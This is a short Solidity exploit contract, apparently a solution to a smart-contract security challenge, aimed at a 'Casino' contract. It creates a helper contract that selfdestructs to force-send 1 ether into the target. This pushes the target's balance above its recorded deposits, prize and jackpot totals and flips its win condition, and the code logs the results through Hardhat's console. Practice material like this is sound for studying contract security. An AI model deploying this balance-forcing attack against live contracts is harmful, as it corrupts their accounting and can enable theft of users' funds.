// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Casino.sol";
import "hardhat/console.sol";

contract Exploit {
    Casino instance;

    constructor(Casino _instance) payable {
        instance = _instance;
    }

    function finalize() external payable {
        bool condition1 = address(instance).balance >
            instance.totalDeposits() +
                instance.totalPrize() +
                instance.totalJackpot();
        bool condition2 = address(instance).balance >
            instance.totalDeposits() +
                (instance.totalPrize() * 25) /
                100 +
                instance.totalJackpot();
        bool gameOn = instance.gameOn();

        console.log("CONDITION 1", condition1);
        console.log("CONDITION 2", condition2);
        console.log("GAME ON", gameOn);

        console.log("BALANCE", address(instance).balance);
        console.log("TOTAL DEPOSIT", instance.totalDeposits());
        console.log("TOTAL PRIZE", instance.totalPrize());
        console.log("TOTAL JACKPOT", instance.totalJackpot());

        Destruct destruct = new Destruct{value: 1 ether}();
        destruct.kill(address(instance));

        console.log("BALANCE", address(instance).balance);
        console.log(
            "RESULT",
            (gameOn && condition1) || (!gameOn && condition2)
        );
    }

    receive() external payable {}
}

contract Destruct {
    constructor() payable {}

    function kill(address casino) external payable {
        selfdestruct(payable(casino));
    }
}
